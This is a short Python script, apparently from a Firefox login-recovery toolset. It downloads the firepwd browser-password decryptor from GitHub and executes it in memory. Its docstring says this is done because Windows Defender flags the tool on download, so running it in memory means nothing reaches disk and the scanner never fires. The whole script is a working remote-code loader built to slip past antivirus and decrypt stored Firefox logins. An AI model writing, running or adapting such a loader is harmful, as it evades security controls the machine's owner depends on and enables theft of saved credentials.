#!/usr/bin/env python3
"""
Route B: legacy NSS decryptor (firepwd) executed WITHOUT a disk artifact.
firepwd is signature-flagged by Defender on download (os error 225), so this
runner fetches it into memory and execs it: nothing lands on disk, the write
scanner never fires. Legacy 3DES scheme — only usable on pre-2018 profiles;
modern profiles (AES-256/PBES2) need routes/firefox-login-recovery.py.

Usage:
  C:/Python315/python.exe scripts/firefox-login-recovery-nss.py -d <profile-dir>
"""
import sys, urllib.request

URL = "https://raw.githubusercontent.com/lclevy/firepwd/master/firepwd.py"
print(f"[route-b] fetching firepwd in-memory: {URL}", file=sys.stderr)
src = urllib.request.urlopen(URL, timeout=30).read().decode("utf-8")
print(f"[route-b] {len(src)} bytes, executing (legacy 3DES — expect IV errors on modern profiles)", file=sys.stderr)
ns = {"__name__": "__main__"}
# argv passthrough minus the script name
sys.argv = ["firepwd.py"] + sys.argv[1:]
exec(compile(src, "firepwd.py", "exec"), ns)